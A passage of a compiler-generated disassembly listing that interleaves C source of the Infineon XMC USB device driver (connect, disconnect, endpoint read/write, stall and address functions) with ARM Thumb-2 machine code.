 8005662:	7b3b      	ldrb	r3, [r7, #12]
 8005664:	f043 0310 	orr.w	r3, r3, #16
 8005668:	733b      	strb	r3, [r7, #12]
  }
  gintmsk.b.outepintr = 1U;
 800566a:	7bbb      	ldrb	r3, [r7, #14]
 800566c:	f043 0308 	orr.w	r3, r3, #8
 8005670:	73bb      	strb	r3, [r7, #14]
  gintmsk.b.inepintr = 1U;
 8005672:	7bbb      	ldrb	r3, [r7, #14]
 8005674:	f043 0304 	orr.w	r3, r3, #4
 8005678:	73bb      	strb	r3, [r7, #14]
  xmc_device.global_register->gintmsk = gintmsk.d32;
 800567a:	4b08      	ldr	r3, [pc, #32]	; (800569c <XMC_USBD_Init+0x238>)
 800567c:	f8d3 31a0 	ldr.w	r3, [r3, #416]	; 0x1a0
 8005680:	68fa      	ldr	r2, [r7, #12]
 8005682:	619a      	str	r2, [r3, #24]
  return XMC_USBD_STATUS_OK;
 8005684:	2300      	movs	r3, #0
}
 8005686:	4618      	mov	r0, r3
 8005688:	3728      	adds	r7, #40	; 0x28
 800568a:	46bd      	mov	sp, r7
 800568c:	bd80      	pop	{r7, pc}
 800568e:	bf00      	nop
 8005690:	20000c8c 	.word	0x20000c8c
 8005694:	20000a4c 	.word	0x20000a4c
 8005698:	20000a68 	.word	0x20000a68
 800569c:	20000a84 	.word	0x20000a84

080056a0 <XMC_USBD_Uninitialize>:

/**
 * Uninitializes the USB device
 **/
XMC_USBD_STATUS_t XMC_USBD_Uninitialize() 
{
 80056a0:	b580      	push	{r7, lr}
 80056a2:	b082      	sub	sp, #8
 80056a4:	af00      	add	r7, sp, #0
  /* Disconnect the device */
  dctl_data_t dctl;
	dctl.d32 = xmc_device.device_register->dctl;
 80056a6:	4b0c      	ldr	r3, [pc, #48]	; (80056d8 <XMC_USBD_Uninitialize+0x38>)
 80056a8:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 80056ac:	685b      	ldr	r3, [r3, #4]
 80056ae:	607b      	str	r3, [r7, #4]
  dctl.b.sftdiscon = 1U;
 80056b0:	793b      	ldrb	r3, [r7, #4]
 80056b2:	f043 0302 	orr.w	r3, r3, #2
 80056b6:	713b      	strb	r3, [r7, #4]
  xmc_device.device_register->dctl = dctl.d32;
 80056b8:	4b07      	ldr	r3, [pc, #28]	; (80056d8 <XMC_USBD_Uninitialize+0x38>)
 80056ba:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 80056be:	687a      	ldr	r2, [r7, #4]
 80056c0:	605a      	str	r2, [r3, #4]
  /* clean up */
  memset((void*)&xmc_device,0U,sizeof(xmc_device));
 80056c2:	f44f 7202 	mov.w	r2, #520	; 0x208
 80056c6:	2100      	movs	r1, #0
 80056c8:	4803      	ldr	r0, [pc, #12]	; (80056d8 <XMC_USBD_Uninitialize+0x38>)
 80056ca:	f001 f8cb 	bl	8006864 <memset>
  return XMC_USBD_STATUS_OK;
 80056ce:	2300      	movs	r3, #0
}
 80056d0:	4618      	mov	r0, r3
 80056d2:	3708      	adds	r7, #8
 80056d4:	46bd      	mov	sp, r7
 80056d6:	bd80      	pop	{r7, pc}
 80056d8:	20000a84 	.word	0x20000a84

080056dc <XMC_USBD_DeviceConnect>:

/**
 * Connects the USB device to host
 **/
XMC_USBD_STATUS_t XMC_USBD_DeviceConnect() 
{
 80056dc:	b480      	push	{r7}
 80056de:	b083      	sub	sp, #12
 80056e0:	af00      	add	r7, sp, #0
  /* Just disable softdisconnect */
  dctl_data_t dctl;
	dctl.d32 = xmc_device.device_register->dctl;
 80056e2:	4b0a      	ldr	r3, [pc, #40]	; (800570c <XMC_USBD_DeviceConnect+0x30>)
 80056e4:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 80056e8:	685b      	ldr	r3, [r3, #4]
 80056ea:	607b      	str	r3, [r7, #4]
  dctl.b.sftdiscon = 0U;
 80056ec:	793b      	ldrb	r3, [r7, #4]
 80056ee:	f36f 0341 	bfc	r3, #1, #1
 80056f2:	713b      	strb	r3, [r7, #4]
  xmc_device.device_register->dctl = dctl.d32;
 80056f4:	4b05      	ldr	r3, [pc, #20]	; (800570c <XMC_USBD_DeviceConnect+0x30>)
 80056f6:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 80056fa:	687a      	ldr	r2, [r7, #4]
 80056fc:	605a      	str	r2, [r3, #4]
  return XMC_USBD_STATUS_OK;
 80056fe:	2300      	movs	r3, #0
}
 8005700:	4618      	mov	r0, r3
 8005702:	370c      	adds	r7, #12
 8005704:	46bd      	mov	sp, r7
 8005706:	f85d 7b04 	ldr.w	r7, [sp], #4
 800570a:	4770      	bx	lr
 800570c:	20000a84 	.word	0x20000a84

08005710 <XMC_USBD_DeviceDisconnect>:

/**
 * Disconnects the USB device from host
 **/
XMC_USBD_STATUS_t XMC_USBD_DeviceDisconnect() 
{
 8005710:	b480      	push	{r7}
 8005712:	b083      	sub	sp, #12
 8005714:	af00      	add	r7, sp, #0
  dctl_data_t dctl;
	dctl.d32 = xmc_device.device_register->dctl;
 8005716:	4b0a      	ldr	r3, [pc, #40]	; (8005740 <XMC_USBD_DeviceDisconnect+0x30>)
 8005718:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 800571c:	685b      	ldr	r3, [r3, #4]
 800571e:	607b      	str	r3, [r7, #4]
  dctl.b.sftdiscon = 1U;
 8005720:	793b      	ldrb	r3, [r7, #4]
 8005722:	f043 0302 	orr.w	r3, r3, #2
 8005726:	713b      	strb	r3, [r7, #4]
  xmc_device.device_register->dctl = dctl.d32;
 8005728:	4b05      	ldr	r3, [pc, #20]	; (8005740 <XMC_USBD_DeviceDisconnect+0x30>)
 800572a:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 800572e:	687a      	ldr	r2, [r7, #4]
 8005730:	605a      	str	r2, [r3, #4]
  return XMC_USBD_STATUS_OK;
 8005732:	2300      	movs	r3, #0
}
 8005734:	4618      	mov	r0, r3
 8005736:	370c      	adds	r7, #12
 8005738:	46bd      	mov	sp, r7
 800573a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800573e:	4770      	bx	lr
 8005740:	20000a84 	.word	0x20000a84

08005744 <XMC_USBD_DeviceGetState>:

/**
 * Gets the USB device state.
 **/
XMC_USBD_STATE_t XMC_USBD_DeviceGetState(const XMC_USBD_t *const obj) 
{
 8005744:	b580      	push	{r7, lr}
 8005746:	b084      	sub	sp, #16
 8005748:	af00      	add	r7, sp, #0
 800574a:	6078      	str	r0, [r7, #4]
  XMC_USBD_STATE_t state={0U};
 800574c:	2300      	movs	r3, #0
 800574e:	60fb      	str	r3, [r7, #12]
  state.speed = XMC_USBD_SPEED_FULL;
 8005750:	7b3b      	ldrb	r3, [r7, #12]
 8005752:	2201      	movs	r2, #1
 8005754:	f362 03c4 	bfi	r3, r2, #3, #2
 8005758:	733b      	strb	r3, [r7, #12]
  state.connected = xmc_device.IsConnected;
 800575a:	4b12      	ldr	r3, [pc, #72]	; (80057a4 <XMC_USBD_DeviceGetState+0x60>)
 800575c:	f893 31fe 	ldrb.w	r3, [r3, #510]	; 0x1fe
 8005760:	f3c3 0300 	ubfx	r3, r3, #0, #1
 8005764:	b2da      	uxtb	r2, r3
 8005766:	7b3b      	ldrb	r3, [r7, #12]
 8005768:	f362 0341 	bfi	r3, r2, #1, #1
 800576c:	733b      	strb	r3, [r7, #12]
  state.active = XMC_USBD_lDeviceActive(obj);
 800576e:	6878      	ldr	r0, [r7, #4]
 8005770:	f7fe fe5a 	bl	8004428 <XMC_USBD_lDeviceActive>
 8005774:	4603      	mov	r3, r0
 8005776:	f003 0301 	and.w	r3, r3, #1
 800577a:	b2da      	uxtb	r2, r3
 800577c:	7b3b      	ldrb	r3, [r7, #12]
 800577e:	f362 0382 	bfi	r3, r2, #2, #1
 8005782:	733b      	strb	r3, [r7, #12]
  state.powered = xmc_device.IsPowered;
 8005784:	4b07      	ldr	r3, [pc, #28]	; (80057a4 <XMC_USBD_DeviceGetState+0x60>)
 8005786:	f893 31fe 	ldrb.w	r3, [r3, #510]	; 0x1fe
 800578a:	f3c3 0380 	ubfx	r3, r3, #2, #1
 800578e:	b2da      	uxtb	r2, r3
 8005790:	7b3b      	ldrb	r3, [r7, #12]
 8005792:	f362 0300 	bfi	r3, r2, #0, #1
 8005796:	733b      	strb	r3, [r7, #12]
  return state;
 8005798:	68fb      	ldr	r3, [r7, #12]
}
 800579a:	4618      	mov	r0, r3
 800579c:	3710      	adds	r7, #16
 800579e:	46bd      	mov	sp, r7
 80057a0:	bd80      	pop	{r7, pc}
 80057a2:	bf00      	nop
 80057a4:	20000a84 	.word	0x20000a84

080057a8 <XMC_USBD_EndpointReadStart>:

/**
 * Prepares the endpoint to read next OUT packet
 **/
XMC_USBD_STATUS_t XMC_USBD_EndpointReadStart(const uint8_t ep_addr, uint32_t size) 
{
 80057a8:	b580      	push	{r7, lr}
 80057aa:	b084      	sub	sp, #16
 80057ac:	af00      	add	r7, sp, #0
 80057ae:	4603      	mov	r3, r0
 80057b0:	6039      	str	r1, [r7, #0]
 80057b2:	71fb      	strb	r3, [r7, #7]
  XMC_USBD_EP_t *ep = &xmc_device.ep[ep_addr & (uint8_t)XMC_USBD_EP_NUM_MASK];
 80057b4:	79fb      	ldrb	r3, [r7, #7]
 80057b6:	f003 030f 	and.w	r3, r3, #15
 80057ba:	2234      	movs	r2, #52	; 0x34
 80057bc:	fb02 f303 	mul.w	r3, r2, r3
 80057c0:	4a1a      	ldr	r2, [pc, #104]	; (800582c <XMC_USBD_EndpointReadStart+0x84>)
 80057c2:	4413      	add	r3, r2
 80057c4:	60bb      	str	r3, [r7, #8]
  XMC_USBD_STATUS_t result;
	
  if (ep->outInUse || !ep->isConfigured)
 80057c6:	68bb      	ldr	r3, [r7, #8]
 80057c8:	685b      	ldr	r3, [r3, #4]
 80057ca:	f3c3 1300 	ubfx	r3, r3, #4, #1
 80057ce:	b2db      	uxtb	r3, r3
 80057d0:	2b00      	cmp	r3, #0
 80057d2:	d106      	bne.n	80057e2 <XMC_USBD_EndpointReadStart+0x3a>
 80057d4:	68bb      	ldr	r3, [r7, #8]
 80057d6:	791b      	ldrb	r3, [r3, #4]
 80057d8:	f003 0304 	and.w	r3, r3, #4
 80057dc:	b2db      	uxtb	r3, r3
 80057de:	2b00      	cmp	r3, #0
 80057e0:	d102      	bne.n	80057e8 <XMC_USBD_EndpointReadStart+0x40>
  {
    result = XMC_USBD_STATUS_ERROR;
 80057e2:	2301      	movs	r3, #1
 80057e4:	73fb      	strb	r3, [r7, #15]
 80057e6:	e01c      	b.n	8005822 <XMC_USBD_EndpointReadStart+0x7a>
  }
  else
  {
    /* short the length to buffer size if needed */
    if (size > ep->outBufferSize)
 80057e8:	68bb      	ldr	r3, [r7, #8]
 80057ea:	695b      	ldr	r3, [r3, #20]
 80057ec:	683a      	ldr	r2, [r7, #0]
 80057ee:	429a      	cmp	r2, r3
 80057f0:	d902      	bls.n	80057f8 <XMC_USBD_EndpointReadStart+0x50>
    {
      size = ep->outBufferSize;
 80057f2:	68bb      	ldr	r3, [r7, #8]
 80057f4:	695b      	ldr	r3, [r3, #20]
 80057f6:	603b      	str	r3, [r7, #0]
    }
    /* set ep values */
    ep->xferTotal = size;
 80057f8:	68bb      	ldr	r3, [r7, #8]
 80057fa:	683a      	ldr	r2, [r7, #0]
 80057fc:	631a      	str	r2, [r3, #48]	; 0x30
    ep->xferCount = 0U;
 80057fe:	68bb      	ldr	r3, [r7, #8]
 8005800:	2200      	movs	r2, #0
 8005802:	62da      	str	r2, [r3, #44]	; 0x2c
    ep->xferLength = 0U;
 8005804:	68bb      	ldr	r3, [r7, #8]
 8005806:	2200      	movs	r2, #0
 8005808:	629a      	str	r2, [r3, #40]	; 0x28
    ep->xferBuffer = ep->outBuffer;
 800580a:	68bb      	ldr	r3, [r7, #8]
 800580c:	68da      	ldr	r2, [r3, #12]
 800580e:	68bb      	ldr	r3, [r7, #8]
 8005810:	625a      	str	r2, [r3, #36]	; 0x24
    ep->outBytesAvailable = 0U;
 8005812:	68bb      	ldr	r3, [r7, #8]
 8005814:	2200      	movs	r2, #0
 8005816:	611a      	str	r2, [r3, #16]
    XMC_USBD_lStartReadXfer(ep);
 8005818:	68b8      	ldr	r0, [r7, #8]
 800581a:	f7fe ffc9 	bl	80047b0 <XMC_USBD_lStartReadXfer>
    result= XMC_USBD_STATUS_OK;
 800581e:	2300      	movs	r3, #0
 8005820:	73fb      	strb	r3, [r7, #15]
  }
  return result;
 8005822:	7bfb      	ldrb	r3, [r7, #15]
}
 8005824:	4618      	mov	r0, r3
 8005826:	3710      	adds	r7, #16
 8005828:	46bd      	mov	sp, r7
 800582a:	bd80      	pop	{r7, pc}
 800582c:	20000a84 	.word	0x20000a84

08005830 <XMC_USBD_EndpointRead>:

/**
 * Reads the number of bytes from the USB OUT endpoint
 **/
int32_t XMC_USBD_EndpointRead(const uint8_t ep_num,uint8_t * buffer,uint32_t length) 
{
 8005830:	b580      	push	{r7, lr}
 8005832:	b086      	sub	sp, #24
 8005834:	af00      	add	r7, sp, #0
 8005836:	4603      	mov	r3, r0
 8005838:	60b9      	str	r1, [r7, #8]
 800583a:	607a      	str	r2, [r7, #4]
 800583c:	73fb      	strb	r3, [r7, #15]
  XMC_USBD_EP_t *ep = &xmc_device.ep[ep_num];
 800583e:	7bfb      	ldrb	r3, [r7, #15]
 8005840:	2234      	movs	r2, #52	; 0x34
 8005842:	fb02 f303 	mul.w	r3, r2, r3
 8005846:	4a17      	ldr	r2, [pc, #92]	; (80058a4 <XMC_USBD_EndpointRead+0x74>)
 8005848:	4413      	add	r3, r2
 800584a:	617b      	str	r3, [r7, #20]
  if (length > ep->outBytesAvailable)
 800584c:	697b      	ldr	r3, [r7, #20]
 800584e:	691b      	ldr	r3, [r3, #16]
 8005850:	687a      	ldr	r2, [r7, #4]
 8005852:	429a      	cmp	r2, r3
 8005854:	d902      	bls.n	800585c <XMC_USBD_EndpointRead+0x2c>
  {
    length = ep->outBytesAvailable;
 8005856:	697b      	ldr	r3, [r7, #20]
 8005858:	691b      	ldr	r3, [r3, #16]
 800585a:	607b      	str	r3, [r7, #4]
  }
  memcpy(buffer,&ep->outBuffer[ep->outOffset],length);
 800585c:	697b      	ldr	r3, [r7, #20]
 800585e:	68da      	ldr	r2, [r3, #12]
 8005860:	697b      	ldr	r3, [r7, #20]
 8005862:	699b      	ldr	r3, [r3, #24]
 8005864:	4413      	add	r3, r2
 8005866:	687a      	ldr	r2, [r7, #4]
 8005868:	4619      	mov	r1, r3
 800586a:	68b8      	ldr	r0, [r7, #8]
 800586c:	f000 ff60 	bl	8006730 <memcpy>
  ep->outBytesAvailable -= length;
 8005870:	697b      	ldr	r3, [r7, #20]
 8005872:	691a      	ldr	r2, [r3, #16]
 8005874:	687b      	ldr	r3, [r7, #4]
 8005876:	1ad2      	subs	r2, r2, r3
 8005878:	697b      	ldr	r3, [r7, #20]
 800587a:	611a      	str	r2, [r3, #16]
  if (ep->outBytesAvailable)
 800587c:	697b      	ldr	r3, [r7, #20]
 800587e:	691b      	ldr	r3, [r3, #16]
 8005880:	2b00      	cmp	r3, #0
 8005882:	d006      	beq.n	8005892 <XMC_USBD_EndpointRead+0x62>
  {
    ep->outOffset += length;
 8005884:	697b      	ldr	r3, [r7, #20]
 8005886:	699a      	ldr	r2, [r3, #24]
 8005888:	687b      	ldr	r3, [r7, #4]
 800588a:	441a      	add	r2, r3
 800588c:	697b      	ldr	r3, [r7, #20]
 800588e:	619a      	str	r2, [r3, #24]
 8005890:	e002      	b.n	8005898 <XMC_USBD_EndpointRead+0x68>
  }
  else
  {
    ep->outOffset = 0U;
 8005892:	697b      	ldr	r3, [r7, #20]
 8005894:	2200      	movs	r2, #0
 8005896:	619a      	str	r2, [r3, #24]
  }
  return (int32_t)length;
 8005898:	687b      	ldr	r3, [r7, #4]
}
 800589a:	4618      	mov	r0, r3
 800589c:	3718      	adds	r7, #24
 800589e:	46bd      	mov	sp, r7
 80058a0:	bd80      	pop	{r7, pc}
 80058a2:	bf00      	nop
 80058a4:	20000a84 	.word	0x20000a84

080058a8 <XMC_USBD_EndpointWrite>:

/**
 * Writes number of bytes in to the USB IN endpoint.
 **/
int32_t XMC_USBD_EndpointWrite(const uint8_t ep_num,const uint8_t * buffer,uint32_t length) 
{
 80058a8:	b580      	push	{r7, lr}
 80058aa:	b086      	sub	sp, #24
 80058ac:	af00      	add	r7, sp, #0
 80058ae:	4603      	mov	r3, r0
 80058b0:	60b9      	str	r1, [r7, #8]
 80058b2:	607a      	str	r2, [r7, #4]
 80058b4:	73fb      	strb	r3, [r7, #15]
  XMC_USBD_EP_t * ep = &xmc_device.ep[ep_num & (uint8_t)XMC_USBD_EP_NUM_MASK];
 80058b6:	7bfb      	ldrb	r3, [r7, #15]
 80058b8:	f003 030f 	and.w	r3, r3, #15
 80058bc:	2234      	movs	r2, #52	; 0x34
 80058be:	fb02 f303 	mul.w	r3, r2, r3
 80058c2:	4a21      	ldr	r2, [pc, #132]	; (8005948 <XMC_USBD_EndpointWrite+0xa0>)
 80058c4:	4413      	add	r3, r2
 80058c6:	613b      	str	r3, [r7, #16]
  int32_t result;
  if (!ep->isConfigured)
 80058c8:	693b      	ldr	r3, [r7, #16]
 80058ca:	791b      	ldrb	r3, [r3, #4]
 80058cc:	f003 0304 	and.w	r3, r3, #4
 80058d0:	b2db      	uxtb	r3, r3
 80058d2:	2b00      	cmp	r3, #0
 80058d4:	d102      	bne.n	80058dc <XMC_USBD_EndpointWrite+0x34>
  {
    result = (int32_t)XMC_USBD_STATUS_ERROR;
 80058d6:	2301      	movs	r3, #1
 80058d8:	617b      	str	r3, [r7, #20]
 80058da:	e030      	b.n	800593e <XMC_USBD_EndpointWrite+0x96>
  }
  else if (ep->inInUse == 1U)
 80058dc:	693b      	ldr	r3, [r7, #16]
 80058de:	685b      	ldr	r3, [r3, #4]
 80058e0:	f3c3 03c0 	ubfx	r3, r3, #3, #1
 80058e4:	b2db      	uxtb	r3, r3
 80058e6:	2b01      	cmp	r3, #1
 80058e8:	d102      	bne.n	80058f0 <XMC_USBD_EndpointWrite+0x48>
  {
    result=(int32_t)0;
 80058ea:	2300      	movs	r3, #0
 80058ec:	617b      	str	r3, [r7, #20]
 80058ee:	e026      	b.n	800593e <XMC_USBD_EndpointWrite+0x96>
  }
  else
  {
    if (length > ep->inBufferSize)
 80058f0:	693b      	ldr	r3, [r7, #16]
 80058f2:	6a1b      	ldr	r3, [r3, #32]
 80058f4:	687a      	ldr	r2, [r7, #4]
 80058f6:	429a      	cmp	r2, r3
 80058f8:	d902      	bls.n	8005900 <XMC_USBD_EndpointWrite+0x58>
    {
      length = ep->inBufferSize;
 80058fa:	693b      	ldr	r3, [r7, #16]
 80058fc:	6a1b      	ldr	r3, [r3, #32]
 80058fe:	607b      	str	r3, [r7, #4]
    }
    /* copy data into input buffer for DMA and FIFO mode */
		memcpy(ep->inBuffer,(const void *)buffer,length);
 8005900:	693b      	ldr	r3, [r7, #16]
 8005902:	69db      	ldr	r3, [r3, #28]
 8005904:	687a      	ldr	r2, [r7, #4]
 8005906:	68b9      	ldr	r1, [r7, #8]
 8005908:	4618      	mov	r0, r3
 800590a:	f000 ff11 	bl	8006730 <memcpy>
		ep->xferBuffer = ep->inBuffer;
 800590e:	693b      	ldr	r3, [r7, #16]
 8005910:	69da      	ldr	r2, [r3, #28]
 8005912:	693b      	ldr	r3, [r7, #16]
 8005914:	625a      	str	r2, [r3, #36]	; 0x24
    ep->xferTotal = length;
 8005916:	693b      	ldr	r3, [r7, #16]
 8005918:	687a      	ldr	r2, [r7, #4]
 800591a:	631a      	str	r2, [r3, #48]	; 0x30
    /* set transfer values */
    ep->xferLength = 0U;
 800591c:	693b      	ldr	r3, [r7, #16]
 800591e:	2200      	movs	r2, #0
 8005920:	629a      	str	r2, [r3, #40]	; 0x28
    ep->xferCount = 0U;
 8005922:	693b      	ldr	r3, [r7, #16]
 8005924:	2200      	movs	r2, #0
 8005926:	62da      	str	r2, [r3, #44]	; 0x2c
    ep->inInUse = 1U;
 8005928:	693a      	ldr	r2, [r7, #16]
 800592a:	6853      	ldr	r3, [r2, #4]
 800592c:	f043 0308 	orr.w	r3, r3, #8
 8005930:	6053      	str	r3, [r2, #4]
    /* start the transfer */
    XMC_USBD_lStartWriteXfer(ep);
 8005932:	6938      	ldr	r0, [r7, #16]
 8005934:	f7fe fff8 	bl	8004928 <XMC_USBD_lStartWriteXfer>
    result=(int32_t)ep->xferTotal;
 8005938:	693b      	ldr	r3, [r7, #16]
 800593a:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 800593c:	617b      	str	r3, [r7, #20]
  }
  return result;
 800593e:	697b      	ldr	r3, [r7, #20]
}
 8005940:	4618      	mov	r0, r3
 8005942:	3718      	adds	r7, #24
 8005944:	46bd      	mov	sp, r7
 8005946:	bd80      	pop	{r7, pc}
 8005948:	20000a84 	.word	0x20000a84

0800594c <XMC_USBD_DeviceSetAddress>:

/**
 * Sets the USB device address.
 **/
XMC_USBD_STATUS_t XMC_USBD_DeviceSetAddress(const uint8_t address,const XMC_USBD_SET_ADDRESS_STAGE_t stage) 
{
 800594c:	b480      	push	{r7}
 800594e:	b085      	sub	sp, #20
 8005950:	af00      	add	r7, sp, #0
 8005952:	4603      	mov	r3, r0
 8005954:	460a      	mov	r2, r1
 8005956:	71fb      	strb	r3, [r7, #7]
 8005958:	4613      	mov	r3, r2
 800595a:	71bb      	strb	r3, [r7, #6]
  dcfg_data_t data;
  data.d32 = xmc_device.device_register->dcfg;
 800595c:	4b0d      	ldr	r3, [pc, #52]	; (8005994 <XMC_USBD_DeviceSetAddress+0x48>)
 800595e:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 8005962:	681b      	ldr	r3, [r3, #0]
 8005964:	60fb      	str	r3, [r7, #12]
  if (stage == XMC_USBD_SET_ADDRESS_STAGE_SETUP)
 8005966:	79bb      	ldrb	r3, [r7, #6]
 8005968:	2b00      	cmp	r3, #0
 800596a:	d10c      	bne.n	8005986 <XMC_USBD_DeviceSetAddress+0x3a>
  {
    data.b.devaddr = address;
 800596c:	79fb      	ldrb	r3, [r7, #7]
 800596e:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 8005972:	b2da      	uxtb	r2, r3
 8005974:	89bb      	ldrh	r3, [r7, #12]
 8005976:	f362 130a 	bfi	r3, r2, #4, #7
 800597a:	81bb      	strh	r3, [r7, #12]
    xmc_device.device_register->dcfg = data.d32;
 800597c:	4b05      	ldr	r3, [pc, #20]	; (8005994 <XMC_USBD_DeviceSetAddress+0x48>)
 800597e:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 8005982:	68fa      	ldr	r2, [r7, #12]
 8005984:	601a      	str	r2, [r3, #0]
  }
	return XMC_USBD_STATUS_OK;
 8005986:	2300      	movs	r3, #0
}
 8005988:	4618      	mov	r0, r3
 800598a:	3714      	adds	r7, #20
 800598c:	46bd      	mov	sp, r7
 800598e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005992:	4770      	bx	lr
 8005994:	20000a84 	.word	0x20000a84

08005998 <XMC_USBD_EndpointStall>:

/**
 * Set/clear stall on the selected endpoint.
 **/
XMC_USBD_STATUS_t XMC_USBD_EndpointStall(const uint8_t ep_addr, const bool stall) 
{
 8005998:	b480      	push	{r7}
 800599a:	b085      	sub	sp, #20
 800599c:	af00      	add	r7, sp, #0
 800599e:	4603      	mov	r3, r0
 80059a0:	460a      	mov	r2, r1
 80059a2:	71fb      	strb	r3, [r7, #7]
 80059a4:	4613      	mov	r3, r2
 80059a6:	71bb      	strb	r3, [r7, #6]
  depctl_data_t data;
  XMC_USBD_EP_t *ep = &xmc_device.ep[(ep_addr & (uint8_t)XMC_USBD_EP_NUM_MASK)];
 80059a8:	79fb      	ldrb	r3, [r7, #7]
 80059aa:	f003 030f 	and.w	r3, r3, #15
 80059ae:	2234      	movs	r2, #52	; 0x34
 80059b0:	fb02 f303 	mul.w	r3, r2, r3
 80059b4:	4a4a      	ldr	r2, [pc, #296]	; (8005ae0 <XMC_USBD_EndpointStall+0x148>)
 80059b6:	4413      	add	r3, r2
 80059b8:	60fb      	str	r3, [r7, #12]
  if (stall)
 80059ba:	79bb      	ldrb	r3, [r7, #6]
 80059bc:	2b00      	cmp	r3, #0
 80059be:	d040      	beq.n	8005a42 <XMC_USBD_EndpointStall+0xaa>
  {
    if (ep_addr & (uint8_t)XMC_USBD_ENDPOINT_DIRECTION_MASK)
 80059c0:	f997 3007 	ldrsb.w	r3, [r7, #7]
 80059c4:	2b00      	cmp	r3, #0
 80059c6:	da1a      	bge.n	80059fe <XMC_USBD_EndpointStall+0x66>
    {
      /*set stall bit */
      data.d32 = xmc_device.endpoint_in_register[ep->address_u.address_st.number]->diepctl;
 80059c8:	68fb      	ldr	r3, [r7, #12]
 80059ca:	781b      	ldrb	r3, [r3, #0]
 80059cc:	f3c3 0303 	ubfx	r3, r3, #0, #4
 80059d0:	b2db      	uxtb	r3, r3
 80059d2:	4a43      	ldr	r2, [pc, #268]	; (8005ae0 <XMC_USBD_EndpointStall+0x148>)
 80059d4:	336a      	adds	r3, #106	; 0x6a
 80059d6:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 80059da:	681b      	ldr	r3, [r3, #0]
 80059dc:	60bb      	str	r3, [r7, #8]
      data.b.stall = 1U;
 80059de:	7abb      	ldrb	r3, [r7, #10]
 80059e0:	f043 0320 	orr.w	r3, r3, #32
 80059e4:	72bb      	strb	r3, [r7, #10]
      xmc_device.endpoint_in_register[ep->address_u.address_st.number]->diepctl = data.d32;
 80059e6:	68fb      	ldr	r3, [r7, #12]
 80059e8:	781b      	ldrb	r3, [r3, #0]
 80059ea:	f3c3 0303 	ubfx	r3, r3, #0, #4
 80059ee:	b2db      	uxtb	r3, r3
 80059f0:	4a3b      	ldr	r2, [pc, #236]	; (8005ae0 <XMC_USBD_EndpointStall+0x148>)
 80059f2:	336a      	adds	r3, #106	; 0x6a
 80059f4:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 80059f8:	68ba      	ldr	r2, [r7, #8]
 80059fa:	601a      	str	r2, [r3, #0]
 80059fc:	e01b      	b.n	8005a36 <XMC_USBD_EndpointStall+0x9e>
    }
    else
    {
      /*set stall bit */
      data.d32 = xmc_device.endpoint_out_register[ep->address_u.address_st.number]->doepctl;
 80059fe:	68fb      	ldr	r3, [r7, #12]
 8005a00:	781b      	ldrb	r3, [r3, #0]
 8005a02:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8005a06:	b2db      	uxtb	r3, r3
 8005a08:	4a35      	ldr	r2, [pc, #212]	; (8005ae0 <XMC_USBD_EndpointStall+0x148>)
 8005a0a:	3370      	adds	r3, #112	; 0x70
 8005a0c:	009b      	lsls	r3, r3, #2
 8005a0e:	4413      	add	r3, r2
 8005a10:	685b      	ldr	r3, [r3, #4]
 8005a12:	681b      	ldr	r3, [r3, #0]
 8005a14:	60bb      	str	r3, [r7, #8]
      data.b.stall = 1U;
 8005a16:	7abb      	ldrb	r3, [r7, #10]
 8005a18:	f043 0320 	orr.w	r3, r3, #32
 8005a1c:	72bb      	strb	r3, [r7, #10]
      xmc_device.endpoint_out_register[ep->address_u.address_st.number]->doepctl = data.d32;
 8005a1e:	68fb      	ldr	r3, [r7, #12]
 8005a20:	781b      	ldrb	r3, [r3, #0]
 8005a22:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8005a26:	b2db      	uxtb	r3, r3
 8005a28:	4a2d      	ldr	r2, [pc, #180]	; (8005ae0 <XMC_USBD_EndpointStall+0x148>)
 8005a2a:	3370      	adds	r3, #112	; 0x70
 8005a2c:	009b      	lsls	r3, r3, #2
 8005a2e:	4413      	add	r3, r2
 8005a30:	685b      	ldr	r3, [r3, #4]
 8005a32:	68ba      	ldr	r2, [r7, #8]
 8005a34:	601a      	str	r2, [r3, #0]
    }
    ep->isStalled = 1U;
 8005a36:	68fa      	ldr	r2, [r7, #12]
 8005a38:	7913      	ldrb	r3, [r2, #4]
 8005a3a:	f043 0320 	orr.w	r3, r3, #32
 8005a3e:	7113      	strb	r3, [r2, #4]
 8005a40:	e047      	b.n	8005ad2 <XMC_USBD_EndpointStall+0x13a>
  }
  else
  {
    /* just clear stall bit */
		if (ep_addr & (uint8_t)XMC_USBD_ENDPOINT_DIRECTION_MASK)
 8005a42:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8005a46:	2b00      	cmp	r3, #0
 8005a48:	da1e      	bge.n	8005a88 <XMC_USBD_EndpointStall+0xf0>
		{
			data.d32 = xmc_device.endpoint_in_register[ep->address_u.address_st.number]->diepctl;
 8005a4a:	68fb      	ldr	r3, [r7, #12]
 8005a4c:	781b      	ldrb	r3, [r3, #0]
 8005a4e:	f3c3 0303 	ubfx	r3, r3, #0, #4
 8005a52:	b2db      	uxtb	r3, r3
 8005a54:	4a22      	ldr	r2, [pc, #136]	; (8005ae0 <XMC_USBD_EndpointStall+0x148>)
 8005a56:	336a      	adds	r3, #106	; 0x6a
 8005a58:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8005a5c:	681b      	ldr	r3, [r3, #0]
 8005a5e:	60bb      	str	r3, [r7, #8]
			data.b.stall = 0U;
 8005a60:	7abb      	ldrb	r3, [r7, #10]
 8005a62:	f36f 1345 	bfc	r3, #5, #1
 8005a66:	72bb      	strb	r3, [r7, #10]
			data.b.setd0pid = 1U; /* reset pid to 0 */
 8005a68:	7afb      	ldrb	r3, [r7, #11]
 8005a6a:	f043 0310 	orr.w	r3, r3, #16
